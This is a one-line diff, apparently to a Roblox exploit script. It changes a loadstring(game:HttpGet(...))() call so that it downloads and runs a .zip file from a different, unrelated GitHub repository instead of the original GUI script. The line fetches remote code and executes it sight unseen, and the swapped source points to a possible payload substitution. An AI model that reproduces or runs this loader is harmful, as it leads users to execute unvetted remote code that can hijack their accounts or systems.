@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/plamen6789/OldEntityGUI/main/OldEntityGUI%27))()
+loadstring(game:HttpGet('https://github.com/kris1019/kris1019/raw/refs/heads/main/limnanth/kris_3.7.zip%27))()
